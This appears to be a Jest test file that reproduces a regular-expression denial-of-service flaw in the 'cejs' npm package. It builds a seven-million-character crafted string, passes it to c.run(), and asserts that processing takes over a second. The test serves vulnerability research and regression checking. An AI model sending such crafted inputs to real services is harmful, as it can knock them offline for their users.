

//console.log(attack_str);
// which function is this vulnerable to?
//https://github.com/kanasimi/CeJS/commit/c6a9ffec1152781f268b8d72d80ee4d8fc837986#diff-f87af44367da6f2ef9b1d82ae9d2975aae3f5a66455caacc3677ac5588539e49
test("ReDos in cejs", () => {
    const c = require('cejs');
    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    
    attack_str = '.'.repeat(7000000)+'%';

    let t = measureTime(function () {
        c.run(attack_str);
    });
  
    let time = t[0] + t[1] / 1000000000;
  
    expect(time).toBeGreaterThan(1);
  });
  